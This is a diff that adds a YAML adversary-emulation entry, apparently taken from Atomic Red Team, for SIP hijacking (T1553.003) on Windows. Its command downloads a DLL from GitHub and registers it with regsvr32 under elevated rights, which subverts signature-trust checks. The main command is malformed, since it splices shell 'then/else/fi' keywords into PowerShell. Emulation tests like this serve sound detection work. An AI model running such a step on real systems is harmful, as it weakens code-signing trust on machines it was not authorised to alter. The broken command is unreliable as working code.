@@ -1,0 +1,54 @@
+- id: e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675
+  name: SIP (Subject Interface Package) Hijacking via Custom DLL
+  description: "Registers a DLL that logs signature checks, mimicking SIP hijacking.\
+    \ This test uses a DLL from \nhttps://github.com/gtworek/PSBits/tree/master/SIP\
+    \ and registers it using regsvr32, thereby causing\nthe system to utilize it during\
+    \ signature checks, and logging said checks."
+  tactic: defense-evasion
+  technique:
+    attack_id: T1553.003
+    name: 'Subvert Trust Controls: SIP and Trust Provider Hijacking'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1553.003\bin\GTSIPProvider.dll")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1553.003\bin\GTSIPProvider.dll") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll"
+          -OutFile "PathToAtomicsFolder\T1553.003\bin\GTSIPProvider.dll"; fi; regsvr32.exe
+          PathToAtomicsFolder\T1553.003\bin\GTSIPProvider.dll'
+        cleanup: 'regsvr32.exe /u #{dll_payload}'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1553.003
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      dll_payload:
+        description: Path to GTSIPProvider.dll
+        type: path
+        default: PathToAtomicsFolder\T1553.003\bin\GTSIPProvider.dll
+    dependencies:
+    - description: 'GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})
+
+        '
+      prereq_command: 'if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{dll_payload}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll"
+        -OutFile "#{dll_payload}"
+
+        '
+    technique_created: '2020-02-05T19:34:04.910Z'
+    atomic_guid: e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675
+    import_timestamp: '2025-06-24T11:15:00.419471Z'
